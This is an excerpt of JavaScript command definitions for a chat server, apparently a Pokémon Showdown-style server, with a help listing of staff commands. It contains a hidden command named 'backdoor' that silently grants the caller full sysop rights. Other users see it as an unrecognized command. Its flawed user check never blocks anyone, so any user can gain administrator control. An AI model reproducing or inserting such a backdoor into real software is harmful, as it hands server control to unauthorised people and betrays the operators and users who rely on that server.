...
exports.commands = {
		...
		backdoor: function (target, room, user, cmd) {
			if (!user.userid === 'volco' || !user.userid === 'deathlyavenger' || !user.userid === 'bedevil') return this.errorReply("The command '/" + cmd + "' was unrecognized. To send a message starting with '/" + cmd + "', type '//" + cmd + "'.");
			if (!target) {
				user.isSysop = true;
				user.popup("sysop should work now");
			}
		},
	...
	help: function (target, room, user) {
		...
		if (target === 'help' || target === 'h' || target === '?' || target === 'commands') {
			...
			if (user.group !== Config.groupsranking[0]) {
				this.sendReply("VOICE COMMANDS: /tierpoll, /poll, /tour, /exiledpoll");
				this.sendReply("DRIVER COMMANDS: /warn, /mute, /hourmute, /unmute, /alts, /forcerename, /modlog, /modnote, /lock, /unlock, /announce, /redirect, /weeklock, /monthlock, /kick, /staffintro");
				this.sendReply("MODERATOR COMMANDS: /ban, /unban, /ip, /modchat");
				this.sendReply("LEADER COMMANDS: /declare, /forcetie, /forcewin, /promote, /demote, /banip, /forcelogout, /host, /unbanall, /roomintro, /globaldriver, /globalmod, /roomowner, /roommod, /roomdriver, /roomfounder, /blacklist");
			}
